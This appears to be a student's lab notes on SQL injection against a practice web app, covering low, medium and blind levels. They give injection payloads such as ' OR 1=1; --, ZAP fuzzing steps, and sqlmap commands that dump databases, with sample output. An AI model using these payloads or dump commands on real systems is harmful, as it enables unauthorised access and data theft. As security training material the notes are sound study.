Poisoning database queries with user input

Low security

" OR 1=1; -- DO NOT FORGET TO ADD A BLANK SPACE AFTER --
On our system use ' instead of "
SELECT * FROM USERS where username=". "OR 1=1; -- "AND password=".$_POST["password"] . ";"
" OR 1=1; --  is used to display all the table.
First we close the username param with no value. This way we do not have any matching condition to select. That is why we add a condition that is always true, 1=1, to select everything using the * selector. -- is used to ignore the following data.


Medium

When we select a number it creates a new context on ZAP
We are clicking on it and open/resend request editor. We modify the id with our payload => Not working even with doucle quotes
We view code source and notice mysqli_real_escape_string() to prevent sql injection
First thing to bypass the protection is to fuzz. We select our POST request and fuzz. When adding payload we select 'File Fuzzers' and fuzzdb (installed add-on)
fuzzdb > attack > sql-injection >detect. As we know we are running mysql database we can only select this option. Basic fuzzing not working

We go back on a POST request in 'History' and launch an 'Active Scan' attack
In advance Show advanced options > Policy  > Apply 'OFF' threshold to all rules go. To turn off all attacks. Then click on 'Injection' > 'SQL Injection' and set threshold to Medium. This is just to make the attack faster. Nothing either

In terminal we go to sqlmap
From ZAP we click on a request > Save Raw > Request > ALL. Saved in Documents
From linux terminal
$sqlmap -r path_to_file --dbms mysql
[05:46:08] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
UNION is a way of joining two sql tables together
We try a new request id=1 UNION SELECT 1 ...; New error message

We try a new shell prompt to dumps databases
$sqlmap -r path_to_file --dbms mysql --dump --dbs
Once we get databases we decide not to go further, sqlmap asksif we want to search for more hashes, we say no. Once it is done we still can decide to crack those hashes.

SQL blind injection

From the git repo PayloadsAllTheThings we get a payload to determine columns number
1' ORDER BY X -- DO NOT FORGET TO ADD EXTRA SPACE AFTER --
X is a variable from 1 to a higher value. We increment X until we get a false returned
From ZAP we see that we get a GET request when submitting form. We save the raw request, only have the header here and go back to sql map
$sqlmap -r blind_header.raw --bdms mysql

[07:08:40] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[07:08:50] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable// using the sleep command on arbitrary seconds to determine weather something is true in the query, longer to return if true





